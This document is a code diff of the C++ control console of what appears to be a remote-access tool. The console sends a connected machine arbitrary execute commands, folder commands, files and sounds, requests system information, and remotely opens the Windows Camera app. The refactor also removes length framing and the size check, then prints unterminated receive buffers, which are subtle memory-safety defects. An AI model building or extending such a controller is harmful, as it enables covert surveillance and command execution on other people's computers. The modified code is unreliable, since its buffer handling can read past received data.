@@ -51,6 +51,7 @@ int main() {
         std::cout << SUCCESS_PREFIX << " Connection established\n";
     }
 
+    int bytesRec, bytesSend;
     while(true) {
         int choice = menu();
 
@@ -64,20 +65,20 @@ int main() {
 
                 if(cmd == "/back") {
                     int back = TYPE_BACK;
-                    send(clientFileDescriptor, &back, sizeof(back), 0);
+                    bytesSend = send(clientFileDescriptor, &back, sizeof(back), 0);
                     break;
                 } else if (cmd.empty()) {
                     continue;
                 }
 
                 int msg = TYPE_TEXT;
-                send(clientFileDescriptor, &msg, sizeof(msg), 0);
-                send(clientFileDescriptor, cmd.c_str(), cmd.size(), 0);
+                bytesSend = send(clientFileDescriptor, &msg, sizeof(msg), 0);
+                bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
 
-                memset(buffer, 0, BUFFERSIZE);
-                recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
+                bytesRec = recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
+                std::string clientRec(buffer, bytesRec);
 
-                std::cout << buffer << std::endl;
+                std::cout << clientRec << std::endl;
             }
         }
 
@@ -88,36 +89,29 @@ int main() {
             std::cout << std::endl;
 
             int type = TYPE_FILE;
-            send(clientFileDescriptor, &type, sizeof(type), 0);
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             sendFile(clientFileDescriptor, path);
         }
 
         if(choice == TYPE_INFO) {
             int type = TYPE_INFO;
-            send(clientFileDescriptor, &type, sizeof(type), 0);
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
 
             std::cout << PENDING_PREFIX << " Requesting client information..\n";
 
-            char clientsIP[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, &clientAddress.sin_addr, clientsIP, INET_ADDRSTRLEN);
+            char infoBuffer[BUFFERSIZE];
+            bytesRec = recv(clientFileDescriptor, infoBuffer, sizeof(infoBuffer), 0);
 
-            int32_t infoLength;
-            int bytesRec = recv(clientFileDescriptor, &infoLength, sizeof(infoLength), 0);
-
-            if(bytesRec > 0 && infoLength > 0 && infoLength < 10000) {
-                char *infoBuffer = new char[infoLength + 1];
-                bytesRec = recv(clientFileDescriptor, infoBuffer, infoLength, 0);
-
+            if(bytesRec > 0) {
                 std::cout << SUCCESS_PREFIX << " Received client information\n\n";
-                if (bytesRec > 0) {
-                    std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| CLIENT INFORMATION |!|!|!|!|!|!|\n";
-                    std::cout << SUCCESS_PREFIX << " Client IP: " << clientsIP <<  std::endl;
-                    std::cout << infoBuffer;
-                    std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| ------------------ |!|!|!|!|!|!|\n";
-                } else {
-                    std::cout << ERROR_PREFIX << " Failed to receive client information\n";
-                }
-                delete infoBuffer;
+                char clientsIP[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, &clientAddress.sin_addr, clientsIP, INET_ADDRSTRLEN);
+                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| CLIENT INFORMATION |!|!|!|!|!|!|\n";
+                std::cout << SUCCESS_PREFIX << " Client IP: " << clientsIP <<  std::endl;
+                std::cout << infoBuffer;
+                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| ------------------ |!|!|!|!|!|!|\n";
+            } else {
+                std::cout << ERROR_PREFIX << " Failed to receive client information\n";
             }
         }
 
@@ -148,25 +142,19 @@ int main() {
                         std::getline(std::cin, path);
 
                         int type = TYPE_EXECUTE;
-                        send(clientFileDescriptor, &type, sizeof(type), 0);
+                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
 
                         int subtype = 1;
-                        send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
 
-                        int32_t pathLen = path.length();
-                        send(clientFileDescriptor, &pathLen, sizeof(pathLen), 0);
-                        send(clientFileDescriptor, path.c_str(), pathLen, 0);
+                        bytesSend = send(clientFileDescriptor, path.c_str(), path.length(), 0);
 
                         std::cout << SUCCESS_PREFIX << " Sent folder cmd.\n";
 
-                        int32_t msgLen;
-                        recv(clientFileDescriptor, &msgLen, sizeof(msgLen), 0);
-
-                        char *msgBuf = new char[msgLen + 1];
-                        recv(clientFileDescriptor, msgBuf, msgLen, 0);
+                        char msgBuf[BUFFERSIZE];
+                        bytesRec = recv(clientFileDescriptor, msgBuf, sizeof(msgBuf), 0);
 
                         std::cout << SUCCESS_PREFIX << " " << msgBuf << std::endl;
-                        delete msgBuf;
                         break;
                     }
 
@@ -177,15 +165,13 @@ int main() {
                         std::getline(std::cin, cmd);
 
                         int type = TYPE_EXECUTE;
-                        send(clientFileDescriptor, &type, sizeof(type), 0);
+                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
 
                         int subtype = 2;
-                        send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
 
-                        int32_t cmdLen = cmd.length();
-                        send(clientFileDescriptor, &cmdLen, sizeof(cmdLen), 0);
                         std::cout << PENDING_PREFIX << " Executing command '" << cmd << "'\n";
-                        send(clientFileDescriptor, cmd.c_str(), cmdLen, 0);
+                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
 
                         std::cout << SUCCESS_PREFIX << " Command: '" << cmd << "' executed\n";
                         break;
@@ -195,14 +181,12 @@ int main() {
                         std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";
 
                         int type = TYPE_EXECUTE;
-                        send(clientFileDescriptor, &type, sizeof(type), 0);
+                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
 
                         int subtype = 3;
-                        send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
 
-                        int32_t cmdLen = sizeof(cmd);
-                        send(clientFileDescriptor, &cmdLen, sizeof(cmdLen), 0);
-                        send(clientFileDescriptor, cmd.c_str(), sizeof(cmd), 0);
+                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
                         std::cout << SUCCESS_PREFIX << " Sent camera execution cmd\n";
                         break;
                     }
@@ -220,13 +204,13 @@ int main() {
 
             int type;
             type = TYPE_SOUND;
-            send(clientFileDescriptor, &type, sizeof(type), 0);
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             sendFile(clientFileDescriptor, path);
         }
 
         if(choice == TYPE_EXIT) {
             int type = TYPE_EXIT;
-            send(clientFileDescriptor, &type, sizeof(type), 0);
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             break;
         }
     }
